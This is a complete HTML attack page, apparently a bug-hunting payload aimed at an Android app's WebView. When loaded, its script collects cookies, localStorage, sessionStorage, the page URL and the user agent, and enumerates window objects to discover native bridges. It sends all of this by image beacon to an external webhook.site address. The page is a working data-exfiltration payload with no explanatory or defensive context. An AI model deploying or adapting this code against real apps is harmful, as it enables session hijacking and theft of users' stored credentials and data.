<!DOCTYPE html>
<html>
<head>
    <title>Solohunter - Exfiltration via Image Beacon</title>
</head>
<body>
    <pre id="output">Collecting data...</pre>
    <script>
        // Helper: send data via GET image beacon (bypasses CORS)
        function sendBeacon(endpoint, params) {
            var img = new Image();
            var url = endpoint + '?' + Object.keys(params).map(function(k) {
                return encodeURIComponent(k) + '=' + encodeURIComponent(params[k]);
            }).join('&');
            img.src = url;
        }

        var webhook = 'https://webhook.site/0090a7a3-5953-4053-b2f1-3498b6d1aae6';

        // --- Part 1: Exfiltrate cookies, origin, etc. ---
        var exfilData = {
            cookies: document.cookie,
            origin: location.origin,
            url: location.href,
            userAgent: navigator.userAgent,
            xRequestedWith: 'com.buuuk.st',           // identify the target app
            localStorage: JSON.stringify(Object.entries(window.localStorage || {})),
            sessionStorage: JSON.stringify(Object.entries(window.sessionStorage || {}))
        };

        // Send as 'data' parameter (JSON stringified)
        sendBeacon(webhook, { data: JSON.stringify(exfilData) });

        // --- Part 2: Enumerate all window objects (native bridge discovery) ---
        var bridges = [];
        for (var k in window) {
            try {
                if (typeof window[k] === 'object' && window[k] !== null) {
                    bridges.push(k);
                }
            } catch(e) {
                // Some properties may throw access errors; ignore them
            }
        }

        // Send bridge list as comma-separated string
        sendBeacon(webhook, { bridges: bridges.join(',') });

        // Display collected data on page for debugging
        document.getElementById('output').textContent = JSON.stringify({
            exfilData: exfilData,
            bridgeCount: bridges.length,
            bridges: bridges
        }, null, 2);
    </script>
</body>
</html>
